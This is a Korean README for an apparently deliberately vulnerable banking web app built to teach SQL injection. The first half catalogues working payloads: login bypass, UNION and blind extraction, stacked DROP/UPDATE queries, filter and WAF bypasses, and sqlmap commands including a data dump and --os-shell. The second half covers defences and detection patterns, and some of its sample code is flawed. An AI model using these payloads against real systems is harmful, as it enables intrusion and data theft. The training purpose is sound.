# SecureBank - sql_injection 시뮬레이션

## 🚀 실행 방법

### Windows
```bash
# 배치 파일 실행
run.bat
```

### 수동 실행
```bash
# 가상환경 생성 및 활성화
python -m venv venv
venv\Scripts\activate  # Windows
source venv/bin/activate  # Linux/Mac

# 의존성 설치
pip install -r requirements.txt

# 애플리케이션 실행
python app.py
```

브라우저에서 `http://localhost:5000` 접속

## 🔐 테스트 계정

| 사용자명 | 비밀번호 | 계정유형 |
|---------|---------|---------|
| admin | admin123 | 관리자 |
| user1 | password123 | 일반고객 |
| user2 | mypassword | 일반고객 |
| guest | guest | 게스트 |

## ⚠️ SQL 인젝션 취약점 분석

### 🎯 취약점이 존재하는 이유

이 시스템은 **교육 목적**으로 의도적으로 SQL 인젝션 취약점을 포함하고 있습니다.

#### 취약한 코드 (app.py 126번째 줄):
```python
# 위험한 방법 - 사용자 입력을 직접 SQL 쿼리에 삽입
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{hashlib.sha256(password.encode()).hexdigest()}'"
cursor.execute(query)
```

### 🔓 SQL 인젝션 공격 방법

#### 1. 인증 우회 공격 (Authentication Bypass)
```
사용자명: admin' OR '1'='1' --
비밀번호: (아무거나)
```

**실행되는 쿼리:**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '해시값'
```

**🔍 공격이 성공하는 이유:**
- **논리 연산자 조작**: `OR` 연산자로 인해 조건 중 하나만 참이면 전체 조건이 참이 됨
- **항상 참인 조건**: `'1'='1'`은 항상 참이므로 username 조건과 관계없이 쿼리가 성공
- **주석 처리**: `--`로 뒤의 password 조건을 무효화시킴
- **문자열 이스케이프**: 작은따옴표(`'`)로 문자열을 조기 종료하고 SQL 구문을 삽입

**변형 공격:**
```sql
admin' OR 1=1#           -- MySQL 주석 사용
admin'/**/OR/**/1=1#     -- 공백을 주석으로 우회
admin' OR 'x'='x         -- 다른 항상 참인 조건
admin') OR ('1'='1       -- 괄호가 있는 경우 대응
```

#### 2. UNION 기반 공격 (UNION-based Attack)
```
사용자명: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 --
비밀번호: (아무거나)
```

**🔍 공격이 성공하는 이유:**
- **UNION 연산자**: 두 개의 SELECT 결과를 합치는 SQL 연산자
- **컬럼 수 맞춤**: 원본 쿼리와 동일한 컬럼 수를 맞춰야 UNION이 작동
- **데이터 타입 호환**: 각 컬럼의 데이터 타입이 호환되어야 함
- **결과 집합 조작**: 공격자가 원하는 데이터를 결과에 포함시킬 수 있음

**단계별 공격:**

**2-1. 컬럼 수 확인:**
```sql
' ORDER BY 1 --    (성공)
' ORDER BY 5 --    (성공)  
' ORDER BY 10 --   (실패) → 컬럼 수는 5~9개
```
**이유**: `ORDER BY` 절은 컬럼 번호로 정렬 가능. 존재하지 않는 컬럼 번호 사용 시 오류 발생

**2-2. 데이터베이스 정보 추출:**
```sql
' UNION SELECT sqlite_version(),database(),user(),4,5 --
' UNION SELECT name,sql,type,4,5 FROM sqlite_master --
```
**이유**: 시스템 함수와 메타데이터 테이블을 이용해 DB 구조 정보 획득

**2-3. 테이블 구조 파악:**
```sql
' UNION SELECT name,1,2,3,4 FROM sqlite_master WHERE type='table' --
' UNION SELECT sql,1,2,3,4 FROM sqlite_master WHERE name='users' --
```
**이유**: `sqlite_master` 테이블은 모든 테이블/인덱스 정보를 포함하는 시스템 테이블

**2-4. 민감한 데이터 추출:**
```sql
' UNION SELECT username,password,email,phone,balance FROM users --
' UNION SELECT account_number,balance,transaction_date,amount,description FROM transactions --
```
**이유**: 테이블 구조를 파악한 후 실제 민감한 데이터를 추출

#### 3. Boolean 기반 블라인드 공격 (Boolean-based Blind)
```
사용자명: ' OR 1=1 --
비밀번호: (아무거나)
```

**🔍 공격이 성공하는 이유:**
- **응답 차이 분석**: 참/거짓 조건에 따른 애플리케이션 응답 차이를 이용
- **점진적 정보 수집**: 한 번에 하나씩 정보를 추출하는 방식
- **오류 메시지 없음**: 직접적인 데이터 노출 없이도 정보 획득 가능
- **자동화 가능**: 스크립트로 자동화하여 대량 정보 추출 가능

**고급 Boolean 공격:**
```sql
-- 데이터베이스 이름 길이 확인
admin' AND (SELECT LENGTH(database()))=10 --
```
**이유**: LENGTH 함수 결과와 특정 값 비교로 참/거짓 판단

```sql
-- 첫 번째 테이블 이름 추출
admin' AND (SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1)='u' --
admin' AND (SELECT SUBSTR(name,2,1) FROM sqlite_master LIMIT 1)='s' --
```
**이유**: SUBSTR 함수로 문자열을 한 글자씩 추출하여 비교

```sql
-- 사용자 수 확인
admin' AND (SELECT COUNT(*) FROM users)>5 --
```
**이유**: COUNT 함수로 레코드 수를 확인하여 데이터베이스 규모 파악

#### 4. 시간 기반 블라인드 공격 (Time-based Blind)
```sql
-- SQLite에서 시간 지연 (CASE 문 활용)
admin' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master) ELSE 1 END) --
```

**🔍 공격이 성공하는 이유:**
- **시간 지연 생성**: 복잡한 쿼리로 의도적인 지연 시간 생성
- **조건부 실행**: CASE 문으로 조건에 따라 다른 쿼리 실행
- **응답 시간 분석**: 서버 응답 시간 차이로 참/거짓 판단
- **카티시안 곱**: 여러 테이블 조인으로 처리 시간 증가

```sql
-- 조건부 시간 지연
admin' AND (SELECT CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a' THEN (SELECT COUNT(*) FROM sqlite_master,sqlite_master) ELSE 1 END) --
```
**이유**: 조건이 참일 때만 시간이 오래 걸리는 쿼리 실행

#### 5. 오류 기반 공격 (Error-based Attack)
```sql
-- 의도적 오류 발생으로 정보 추출
admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```

**🔍 공격이 성공하는 이유:**
- **오류 메시지 노출**: 데이터베이스 오류 메시지에 민감한 정보 포함
- **타입 변환 오류**: 데이터 타입 불일치로 오류 발생 시 데이터 노출
- **집계 함수 오류**: GROUP BY와 집계 함수 조합으로 오류 유발
- **함수 오버플로우**: 수학 함수의 범위 초과로 오류 생성

```sql
-- SQLite 특화 오류 기반
admin' AND (SELECT 1 FROM (SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%user%'))--
```
**이유**: 서브쿼리에서 여러 결과 반환 시 오류 발생하며 데이터 노출

```sql
-- 타입 변환 오류 이용
admin' AND CAST((SELECT password FROM users WHERE username='admin') AS INTEGER) --
```
**이유**: 문자열을 정수로 변환 시 오류 메시지에 원본 문자열 노출

#### 6. 스택 쿼리 공격 (Stacked Queries)
```sql
-- 다중 쿼리 실행 (세미콜론 이용)
admin'; INSERT INTO users VALUES ('hacker','password123','hacker@evil.com','000-0000-0000',1000000); --
```

**🔍 공격이 성공하는 이유:**
- **쿼리 분리자**: 세미콜론(`;`)으로 여러 SQL 문을 연속 실행
- **권한 상속**: 애플리케이션의 데이터베이스 권한을 그대로 사용
- **트랜잭션 컨텍스트**: 동일한 연결에서 실행되어 권한 검사 우회
- **데이터베이스 설정**: 다중 쿼리 실행을 허용하는 설정

```sql
-- 테이블 삭제
admin'; DROP TABLE transactions; --
```
**이유**: DDL(Data Definition Language) 명령어로 스키마 변경 가능

```sql
-- 새 관리자 계정 생성
admin'; UPDATE users SET username='backdoor' WHERE username='admin'; --
```
**이유**: DML(Data Manipulation Language)로 기존 데이터 조작

#### 7. 2차 SQL 인젝션 (Second-Order SQL Injection)
```sql
-- 1단계: 악성 데이터 저장
사용자명: normaluser
비밀번호: password123
이메일: test'; UPDATE users SET password='hacked' WHERE username='admin'; --

-- 2단계: 저장된 데이터가 다른 쿼리에서 실행됨
```

**🔍 공격이 성공하는 이유:**
- **지연된 실행**: 악성 코드가 저장 후 나중에 실행됨
- **컨텍스트 변경**: 저장 시점과 실행 시점의 보안 컨텍스트가 다름
- **입력 검증 우회**: 저장된 데이터는 재검증하지 않는 경우가 많음
- **신뢰된 데이터**: 데이터베이스에서 가져온 데이터를 신뢰하는 경우

#### 8. NoSQL 인젝션 (MongoDB 스타일)
```javascript
// JSON 기반 공격 (웹 API에서)
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
```

**🔍 공격이 성공하는 이유:**
- **연산자 조작**: NoSQL 특수 연산자(`$ne`, `$regex`, `$gt` 등) 악용
- **JSON 구조**: JSON 객체 구조를 조작하여 쿼리 로직 변경
- **타입 혼동**: 문자열 대신 객체를 전달하여 검증 로직 우회
- **스키마리스**: NoSQL의 유연한 스키마 특성 악용

#### 9. XML 기반 SQL 인젝션
```xml
<!-- XML 파라미터를 통한 공격 -->
<user>
    <username>admin' OR '1'='1</username>
    <password>anything</password>
</user>
```

**🔍 공격이 성공하는 이유:**
- **XML 파싱**: XML 데이터를 파싱하여 SQL 쿼리에 직접 삽입
- **CDATA 섹션**: `<![CDATA[]]>` 섹션으로 특수문자 이스케이프 우회
- **XML 인젝션**: XML 구조 자체를 조작하여 추가 노드 삽입
- **네임스페이스 조작**: XML 네임스페이스를 이용한 우회

#### 10. HTTP 헤더 기반 공격
```http
-- User-Agent 헤더 이용
User-Agent: Mozilla/5.0' UNION SELECT password FROM users WHERE username='admin' --

-- X-Forwarded-For 헤더 이용  
X-Forwarded-For: 127.0.0.1' UNION SELECT * FROM users --

-- Cookie 기반 공격
Cookie: sessionid=abc123'; UPDATE users SET password='pwned' WHERE username='admin'; --
```

**🔍 공격이 성공하는 이유:**
- **헤더 로깅**: HTTP 헤더를 데이터베이스에 로깅하는 경우
- **사용자 추적**: User-Agent, IP 등을 사용자 식별에 사용
- **세션 관리**: 쿠키 값을 데이터베이스 쿼리에 직접 사용
- **입력 검증 부재**: 헤더 값에 대한 검증이 부족한 경우

#### 11. 우회 기법 (Bypass Techniques)

**11-1. 공백 우회:**
```sql
admin'/**/OR/**/1=1--
admin'+OR+1=1--
admin'%09OR%091=1--  (탭 문자)
admin'%0aOR%0a1=1--  (개행 문자)
```

**🔍 우회가 성공하는 이유:**
- **공백 필터링**: 일반 공백(스페이스)만 필터링하는 경우
- **주석 활용**: `/* */` 주석으로 공백 대체
- **URL 인코딩**: 특수 공백 문자의 URL 인코딩 형태 사용
- **SQL 파서**: 데이터베이스가 다양한 공백 문자를 동일하게 처리

**11-2. 키워드 필터링 우회:**
```sql
-- OR 필터링 우회
admin' || 1=1--
admin' OR/**/1=1--
admin' %4fR 1=1--  (URL 인코딩)

-- UNION 필터링 우회
admin' /*!UNION*/ SELECT * FROM users--
admin' UN/**/ION SELECT * FROM users--
admin' UNION ALL SELECT * FROM users--
```

**🔍 우회가 성공하는 이유:**
- **대소문자 구분**: 필터가 대소문자를 구분하는 경우
- **MySQL 주석**: `/*!*/` 버전별 주석으로 키워드 숨김
- **문자열 분할**: 키워드를 여러 부분으로 나누어 필터 우회
- **동의어 사용**: `UNION ALL` 등 기능적으로 동일한 다른 키워드 사용

**11-3. 따옴표 필터링 우회:**
```sql
-- 16진수 인코딩
admin OR username=0x61646d696e--  (admin의 16진수)

-- CHAR 함수 이용
admin OR username=CHAR(97,100,109,105,110)--

-- 백슬래시 이용
admin\' OR 1=1--
```

**🔍 우회가 성공하는 이유:**
- **인코딩 변환**: 16진수나 ASCII 코드로 문자열 표현
- **함수 활용**: CHAR, CONCAT 등 함수로 문자열 생성
- **이스케이프 문자**: 백슬래시로 따옴표 이스케이프
- **다른 따옴표**: 백틱(`) 등 다른 종류의 따옴표 사용

#### 12. 고급 데이터 추출 기법

**12-1. 한 글자씩 추출:**
```sql
-- 관리자 비밀번호 첫 글자 확인
admin' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a'--

-- ASCII 값으로 비교
admin' AND (SELECT ASCII(SUBSTR(password,1,1)) FROM users WHERE username='admin')>97--
```

**🔍 기법이 성공하는 이유:**
- **문자열 함수**: SUBSTR로 특정 위치 문자 추출
- **ASCII 변환**: 문자를 숫자로 변환하여 범위 비교 가능
- **이진 탐색**: ASCII 값 범위를 좁혀가며 효율적 추출
- **자동화**: 스크립트로 전체 문자열 자동 추출 가능

**12-2. 길이 기반 추출:**
```sql
-- 비밀번호 길이 확인
admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=10--

-- 테이블 개수 확인
admin' AND (SELECT COUNT(name) FROM sqlite_master WHERE type='table')=5--
```

**🔍 기법이 성공하는 이유:**
- **길이 정보**: 데이터 길이를 먼저 파악하여 추출 범위 결정
- **효율성**: 전체 길이를 알면 더 효율적인 추출 전략 수립
- **검증**: 추출한 데이터의 완전성 검증 가능

#### 13. 자동화 도구 활용

**SQLMap 명령어 예시:**
```bash
# 기본 스캔
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" --dbs

# 테이블 추출
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" -D database --tables

# 데이터 덤프
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" -D database -T users --dump

# 쉘 획득
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" --os-shell
```

**🔍 자동화가 효과적인 이유:**
- **패턴 인식**: 다양한 SQL 인젝션 패턴을 자동으로 시도
- **응답 분석**: HTTP 응답을 분석하여 취약점 자동 탐지
- **최적화**: 가장 효율적인 공격 방법을 자동 선택
- **대량 처리**: 수천 개의 페이로드를 빠르게 테스트

#### 14. 방어 우회 고급 기법

**14-1. WAF 우회:**
```sql
-- 대소문자 혼합
AdMiN' oR 1=1--

-- 인코딩 조합
admin%27%20OR%201=1--

-- 주석 삽입
admin'/*comment*/OR/*comment*/1=1--
```

**🔍 WAF 우회가 성공하는 이유:**
- **시그니처 기반**: WAF가 특정 패턴만 탐지하는 경우
- **정규식 한계**: 복잡한 우회 패턴을 모두 커버하기 어려움
- **성능 제약**: 모든 가능한 패턴을 검사하면 성능 저하
- **업데이트 지연**: 새로운 우회 기법에 대한 대응 지연

**14-2. 길이 제한 우회:**
```sql
-- 짧은 페이로드
'OR 1#
'||1#
';--
```

**🔍 길이 제한 우회가 성공하는 이유:**
- **최소 페이로드**: 가장 짧은 형태의 효과적인 공격 코드
- **연산자 축약**: `||` (OR), `#` (주석) 등 축약 형태 사용
- **필수 요소만**: 공격에 꼭 필요한 최소한의 문자만 사용

**결과:** 모든 사용자 정보에 접근 가능

### 🛡️ 안전한 코드 구현 방법

#### 1. 매개변수화된 쿼리 (Parameterized Query) - 기본 방어

**Python (SQLite3):**
```python
# 안전한 방법 - 매개변수 바인딩
import sqlite3

def safe_login(username, password):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # ? 플레이스홀더 사용
    cursor.execute(
        "SELECT * FROM users WHERE username = ? AND password = ?",
        (username, hashed_password)
    )
    
    result = cursor.fetchone()
    conn.close()
    return result

# 명명된 매개변수 방식
cursor.execute(
    "SELECT * FROM users WHERE username = :username AND password = :password",
    {"username": username, "password": hashed_password}
)
```

**Python (MySQL with PyMySQL):**
```python
import pymysql

def safe_mysql_query(username, password):
    connection = pymysql.connect(
        host='localhost',
        user='db_user',
        password='db_pass',
        database='mydb'
    )
    
    try:
        with connection.cursor() as cursor:
            # %s 플레이스홀더 사용 (MySQL)
            sql = "SELECT * FROM users WHERE username = %s AND password = %s"
            cursor.execute(sql, (username, password))
            result = cursor.fetchone()
            return result
    finally:
        connection.close()
```

**Python (PostgreSQL with psycopg2):**
```python
import psycopg2

def safe_postgresql_query(username, password):
    conn = psycopg2.connect(
        host="localhost",
        database="mydb",
        user="db_user",
        password="db_pass"
    )
    
    try:
        cur = conn.cursor()
        # %s 플레이스홀더 사용 (PostgreSQL)
        cur.execute(
            "SELECT * FROM users WHERE username = %s AND password = %s",
            (username, password)
        )
        result = cur.fetchone()
        return result
    finally:
        conn.close()
```

#### 2. ORM (Object-Relational Mapping) 사용

**SQLAlchemy (Python):**
```python
from sqlalchemy import create_engine, Column, Integer, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'
    id = Column(Integer, primary_key=True)
    username = Column(String(50))
    password = Column(String(255))
    email = Column(String(100))

# 안전한 쿼리
def safe_orm_login(username, password):
    engine = create_engine('sqlite:///database.db')
    Session = sessionmaker(bind=engine)
    session = Session()
    
    try:
        # ORM을 통한 안전한 쿼리
        user = session.query(User).filter(
            User.username == username,
            User.password == password
        ).first()
        return user
    finally:
        session.close()

# 더 복잡한 쿼리도 안전하게
def get_user_transactions(user_id, start_date, end_date):
    transactions = session.query(Transaction).filter(
        Transaction.user_id == user_id,
        Transaction.date.between(start_date, end_date)
    ).all()
    return transactions
```

**Django ORM:**
```python
from django.contrib.auth.models import User
from django.contrib.auth import authenticate

# Django의 내장 인증 시스템 사용
def safe_django_login(username, password):
    user = authenticate(username=username, password=password)
    return user

# 커스텀 쿼리도 안전하게
from myapp.models import Transaction

def get_user_data(user_id):
    # Django ORM은 자동으로 SQL 인젝션 방지
    transactions = Transaction.objects.filter(
        user_id=user_id,
        amount__gt=1000
    ).order_by('-date')
    return transactions
```

#### 3. 입력 검증 및 필터링

**포괄적인 입력 검증:**
```python
import re
import html
from typing import Optional

class InputValidator:
    
    @staticmethod
    def validate_username(username: str) -> bool:
        """사용자명 검증"""
        if not username or len(username) < 3 or len(username) > 50:
            return False
        
        # 영문, 숫자, 언더스코어, 하이픈만 허용
        if not re.match("^[a-zA-Z0-9_-]+$", username):
            return False
            
        return True
    
    @staticmethod
    def validate_email(email: str) -> bool:
        """이메일 검증"""
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return bool(re.match(email_pattern, email))
    
    @staticmethod
    def validate_phone(phone: str) -> bool:
        """전화번호 검증"""
        # 한국 전화번호 패턴
        phone_pattern = r'^01[0-9]-\d{3,4}-\d{4}$'
        return bool(re.match(phone_pattern, phone))
    
    @staticmethod
    def sanitize_input(user_input: str) -> str:
        """입력값 정제"""
        if not user_input:
            return ""
        
        # HTML 엔티티 인코딩
        sanitized = html.escape(user_input)
        
        # SQL 메타문자 제거
        dangerous_chars = ["'", '"', ';', '--', '/*', '*/', 'xp_', 'sp_']
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        
        return sanitized.strip()
    
    @staticmethod
    def validate_sql_input(user_input: str) -> bool:
        """SQL 인젝션 패턴 검사"""
        # 위험한 SQL 키워드 패턴
        dangerous_patterns = [
            r'\b(union|select|insert|update|delete|drop|create|alter|exec|execute)\b',
            r'(\-\-|\/\*|\*\/)',
            r'(\bor\b|\band\b).*[=<>]',
            r'[\'";]',
            r'\b(script|javascript|vbscript)\b'
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, user_input, re.IGNORECASE):
                return False
        
        return True

# 사용 예시
def secure_login_with_validation(username, password):
    # 1. 입력 검증
    if not InputValidator.validate_username(username):
        raise ValueError("Invalid username format")
    
    if not InputValidator.validate_sql_input(username):
        raise ValueError("Potentially malicious input detected")
    
    # 2. 입력값 정제
    clean_username = InputValidator.sanitize_input(username)
    
    # 3. 안전한 쿼리 실행
    return safe_login(clean_username, password)
```

#### 4. 화이트리스트 기반 검증

```python
class WhitelistValidator:
    
    # 허용된 값들의 화이트리스트
    ALLOWED_SORT_COLUMNS = ['username', 'email', 'created_date', 'last_login']
    ALLOWED_SORT_ORDERS = ['ASC', 'DESC']
    ALLOWED_TABLE_NAMES = ['users', 'transactions', 'accounts']
    
    @staticmethod
    def validate_sort_column(column: str) -> bool:
        """정렬 컬럼 화이트리스트 검증"""
        return column in WhitelistValidator.ALLOWED_SORT_COLUMNS
    
    @staticmethod
    def validate_sort_order(order: str) -> bool:
        """정렬 순서 화이트리스트 검증"""
        return order.upper() in WhitelistValidator.ALLOWED_SORT_ORDERS
    
    @staticmethod
    def build_safe_query(table: str, sort_column: str, sort_order: str):
        """화이트리스트 기반 안전한 쿼리 생성"""
        
        # 테이블명 검증
        if table not in WhitelistValidator.ALLOWED_TABLE_NAMES:
            raise ValueError("Invalid table name")
        
        # 정렬 컬럼 검증
        if not WhitelistValidator.validate_sort_column(sort_column):
            raise ValueError("Invalid sort column")
        
        # 정렬 순서 검증
        if not WhitelistValidator.validate_sort_order(sort_order):
            raise ValueError("Invalid sort order")
        
        # 검증된 값들로만 쿼리 구성
        query = f"SELECT * FROM {table} ORDER BY {sort_column} {sort_order.upper()}"
        return query

# 사용 예시
def get_sorted_users(sort_column='username', sort_order='ASC'):
    try:
        query = WhitelistValidator.build_safe_query('users', sort_column, sort_order)
        # 이미 검증된 쿼리이므로 안전하게 실행 가능
        cursor.execute(query)
        return cursor.fetchall()
    except ValueError as e:
        print(f"Validation error: {e}")
        return None
```

#### 5. 저장 프로시저 (Stored Procedure) 사용

**MySQL 저장 프로시저:**
```sql
-- 안전한 로그인 저장 프로시저
DELIMITER //

CREATE PROCEDURE SafeLogin(
    IN p_username VARCHAR(50),
    IN p_password VARCHAR(255)
)
BEGIN
    DECLARE user_count INT DEFAULT 0;
    
    -- 매개변수를 통한 안전한 쿼리
    SELECT COUNT(*) INTO user_count
    FROM users 
    WHERE username = p_username AND password = p_password;
    
    IF user_count > 0 THEN
        SELECT user_id, username, email, role
        FROM users 
        WHERE username = p_username AND password = p_password;
    ELSE
        SELECT NULL as user_id, 'Invalid credentials' as message;
    END IF;
END //

DELIMITER ;
```

**Python에서 저장 프로시저 호출:**
```python
def login_with_stored_procedure(username, password):
    connection = pymysql.connect(
        host='localhost',
        user='db_user',
        password='db_pass',
        database='mydb'
    )
    
    try:
        with connection.cursor() as cursor:
            # 저장 프로시저 호출 - SQL 인젝션 불가능
            cursor.callproc('SafeLogin', [username, password])
            result = cursor.fetchone()
            return result
    finally:
        connection.close()
```

#### 6. 데이터베이스 권한 관리

**최소 권한 원칙 적용:**
```sql
-- 1. 애플리케이션 전용 사용자 생성
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';

-- 2. 필요한 최소 권한만 부여
GRANT SELECT, INSERT, UPDATE ON mydb.users TO 'app_user'@'localhost';
GRANT SELECT, INSERT ON mydb.transactions TO 'app_user'@'localhost';

-- 3. 위험한 권한은 부여하지 않음
-- DROP, CREATE, ALTER, GRANT 등의 권한 제외

-- 4. 읽기 전용 사용자 별도 생성
CREATE USER 'readonly_user'@'localhost' IDENTIFIED BY 'readonly_password';
GRANT SELECT ON mydb.* TO 'readonly_user'@'localhost';

-- 5. 관리자 작업용 사용자 (제한적 사용)
CREATE USER 'admin_user'@'localhost' IDENTIFIED BY 'admin_password';
GRANT ALL PRIVILEGES ON mydb.* TO 'admin_user'@'localhost';
```

**Python에서 권한별 연결 관리:**
```python
class DatabaseManager:
    
    def __init__(self):
        self.app_config = {
            'host': 'localhost',
            'user': 'app_user',
            'password': 'strong_password',
            'database': 'mydb'
        }
        
        self.readonly_config = {
            'host': 'localhost',
            'user': 'readonly_user',
            'password': 'readonly_password',
            'database': 'mydb'
        }
    
    def get_app_connection(self):
        """일반 애플리케이션 작업용 연결"""
        return pymysql.connect(**self.app_config)
    
    def get_readonly_connection(self):
        """읽기 전용 작업용 연결"""
        return pymysql.connect(**self.readonly_config)
    
    def safe_read_query(self, query, params):
        """읽기 전용 쿼리 실행"""
        conn = self.get_readonly_connection()
        try:
            with conn.cursor() as cursor:
                cursor.execute(query, params)
                return cursor.fetchall()
        finally:
            conn.close()
    
    def safe_write_query(self, query, params):
        """쓰기 쿼리 실행"""
        conn = self.get_app_connection()
        try:
            with conn.cursor() as cursor:
                cursor.execute(query, params)
                conn.commit()
                return cursor.rowcount
        finally:
            conn.close()
```

#### 7. 오류 처리 및 로깅

**안전한 오류 처리:**
```python
import logging
import traceback
from datetime import datetime

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('security.log'),
        logging.StreamHandler()
    ]
)

class SecureErrorHandler:
    
    @staticmethod
    def handle_database_error(error, user_input, user_id=None):
        """데이터베이스 오류 안전 처리"""
        
        # 1. 상세한 오류는 로그에만 기록
        error_details = {
            'timestamp': datetime.now().isoformat(),
            'error_type': type(error).__name__,
            'error_message': str(error),
            'user_input': user_input[:100],  # 입력값 일부만 로깅
            'user_id': user_id,
            'stack_trace': traceback.format_exc()
        }
        
        logging.error(f"Database error: {error_details}")
        
        # 2. 사용자에게는 일반적인 메시지만 반환
        return {
            'success': False,
            'message': '시스템 오류가 발생했습니다. 잠시 후 다시 시도해주세요.',
            'error_code': 'DB_ERROR_001'
        }
    
    @staticmethod
    def detect_injection_attempt(user_input, user_id=None):
        """SQL 인젝션 시도 탐지 및 로깅"""
        
        suspicious_patterns = [
            r'\bunion\b.*\bselect\b',
            r'\bor\b.*[=<>].*[\'"]',
            r'(\-\-|\/\*)',
            r'\bdrop\b.*\btable\b',
            r'\bexec\b.*\(',
        ]
        
        for pattern in suspicious_patterns:
            if re.search(pattern, user_input, re.IGNORECASE):
                # 보안 이벤트 로깅
                security_event = {
                    'timestamp': datetime.now().isoformat(),
                    'event_type': 'SQL_INJECTION_ATTEMPT',
                    'user_id': user_id,
                    'source_ip': request.remote_addr if 'request' in globals() else 'unknown',
                    'user_agent': request.user_agent.string if 'request' in globals() else 'unknown',
                    'malicious_input': user_input,
                    'detected_pattern': pattern
                }
                
                logging.warning(f"Security alert: {security_event}")
                
                # 추가 보안 조치 (계정 잠금, IP 차단 등)
                SecurityManager.handle_malicious_activity(user_id, user_input)
                
                return True
        
        return False

def secure_login_with_error_handling(username, password, request_ip=None):
    """완전한 오류 처리가 포함된 안전한 로그인"""
    
    try:
        # 1. 입력 검증
        if not InputValidator.validate_username(username):
            return {'success': False, 'message': '올바른 사용자명을 입력해주세요.'}
        
        # 2. 악성 입력 탐지
        if SecureErrorHandler.detect_injection_attempt(username):
            return {'success': False, 'message': '잘못된 요청입니다.'}
        
        # 3. 안전한 쿼리 실행
        user = safe_login(username, password)
        
        if user:
            logging.info(f"Successful login: user={username}, ip={request_ip}")
            return {'success': True, 'user': user}
        else:
            logging.warning(f"Failed login attempt: user={username}, ip={request_ip}")
            return {'success': False, 'message': '사용자명 또는 비밀번호가 올바르지 않습니다.'}
    
    except Exception as e:
        # 4. 오류 안전 처리
        return SecureErrorHandler.handle_database_error(e, username)
```

#### 8. 웹 애플리케이션 보안 헤더

**Flask 보안 헤더 설정:**
```python
from flask import Flask, request, session
from flask_talisman import Talisman

app = Flask(__name__)

# 보안 헤더 자동 설정
Talisman(app, {
    'force_https': True,
    'strict_transport_security': True,
    'content_security_policy': {
        'default-src': "'self'",
        'script-src': "'self' 'unsafe-inline'",
        'style-src': "'self' 'unsafe-inline'",
        'img-src': "'self' data:",
    }
})

@app.before_request
def security_headers():
    """추가 보안 헤더 설정"""
    
    # SQL 인젝션 방지를 위한 추가 검증
    if request.method == 'POST':
        for key, value in request.form.items():
            if SecureErrorHandler.detect_injection_attempt(value):
                abort(400, "Malicious input detected")
    
    # 세션 보안 강화
    session.permanent = True
    app.permanent_session_lifetime = timedelta(minutes=30)

@app.after_request
def add_security_headers(response):
    """응답에 보안 헤더 추가"""
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response
```

#### 9. 데이터베이스 연결 보안

**연결 보안 강화:**
```python
import ssl
from cryptography.fernet import Fernet

class SecureDatabaseConnection:
    
    def __init__(self):
        self.encryption_key = self._load_encryption_key()
        self.cipher_suite = Fernet(self.encryption_key)
    
    def _load_encryption_key(self):
        """암호화 키 로드 (환경변수나 키 관리 시스템에서)"""
        # 실제로는 환경변수나 키 관리 시스템 사용
        return Fernet.generate_key()
    
    def get_secure_connection(self):
        """SSL/TLS를 사용한 안전한 데이터베이스 연결"""
        
        # SSL 컨텍스트 설정
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_REQUIRED
        
        connection_config = {
            'host': 'localhost',
            'user': 'app_user',
            'password': self._decrypt_password(),
            'database': 'mydb',
            'ssl': ssl_context,
            'ssl_ca': '/path/to/ca-cert.pem',
            'ssl_cert': '/path/to/client-cert.pem',
            'ssl_key': '/path/to/client-key.pem'
        }
        
        return pymysql.connect(**connection_config)
    
    def _decrypt_password(self):
        """암호화된 비밀번호 복호화"""
        encrypted_password = os.getenv('ENCRYPTED_DB_PASSWORD')
        return self.cipher_suite.decrypt(encrypted_password.encode()).decode()

# 연결 풀링으로 성능 최적화
from sqlalchemy import create_engine
from sqlalchemy.pool import QueuePool

def create_secure_engine():
    """보안이 강화된 데이터베이스 엔진 생성"""
    
    connection_string = (
        "mysql+pymysql://app_user:password@localhost/mydb"
        "?ssl_ca=/path/to/ca-cert.pem"
        "&ssl_cert=/path/to/client-cert.pem"
        "&ssl_key=/path/to/client-key.pem"
    )
    
    engine = create_engine(
        connection_string,
        poolclass=QueuePool,
        pool_size=10,
        max_overflow=20,
        pool_pre_ping=True,  # 연결 상태 확인
        pool_recycle=3600,   # 1시간마다 연결 재생성
        echo=False  # 프로덕션에서는 False
    )
    
    return engine
```

#### 10. 실시간 보안 모니터링

**보안 이벤트 모니터링:**
```python
import redis
from datetime import datetime, timedelta

class SecurityMonitor:
    
    def __init__(self):
        self.redis_client = redis.Redis(host='localhost', port=6379, db=0)
        self.max_attempts = 5
        self.lockout_duration = 300  # 5분
    
    def check_rate_limit(self, user_id, action='login'):
        """사용자별 요청 빈도 제한"""
        
        key = f"rate_limit:{action}:{user_id}"
